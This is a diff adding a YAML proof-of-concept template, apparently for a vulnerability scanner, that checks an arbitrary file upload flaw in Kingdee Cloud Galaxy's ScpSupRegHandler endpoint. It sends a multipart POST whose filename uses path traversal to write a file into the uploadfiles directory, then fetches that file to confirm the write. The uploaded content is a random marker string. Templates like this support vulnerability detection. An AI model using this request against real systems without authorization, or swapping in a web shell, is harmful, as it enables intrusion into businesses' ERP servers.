@@ -1,0 +1,66 @@
+id: poc-yaml-kingdee-scpsupreghandler-arbitrary-file-upload
+info:
+  name: 金蝶云星空 ScpSupRegHandler 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 金蝶云星空
+variables:
+  rand_str: random_str(16)
+  filename: random_str(4)
+requests:
+- method: GET
+  path: /k3cloud/SRM/ScpSupRegHandler
+  expression: 'status_code == 200
+
+    && contains(body, "\"IsSuccess\": true")
+
+    && contains(body, "Method\": \"ProcessRequest\"")
+
+    '
+- method: POST
+  path: /k3cloud/SRM/ScpSupRegHandler
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.rand_str}}
+  data: '------WebKitFormBoundary{{.rand_str}}
+
+    Content-Disposition: form-data; name="dbId_v"
+
+
+    .
+
+    ------WebKitFormBoundary{{.rand_str}}
+
+    Content-Disposition: form-data; name="FID"
+
+
+    2023
+
+    ------WebKitFormBoundary{{.rand_str}}
+
+    Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{.filename}}.txt"
+
+    Content-Type: text/plain
+
+
+    {{.rand_str}}
+
+    ------WebKitFormBoundary{{.rand_str}}--
+
+    '
+  expression: 'status_code == 200
+
+    && contains(body, "\"IsSuccess\": true,")
+
+    && contains(body, "附件保存成功！")
+
+    '
+- method: GET
+  path: /K3Cloud/uploadfiles/{{.filename}}.txt
+  expression: 'status_code == 200
+
+    && contains(body, rand_str)
+
+    '
+transport: http
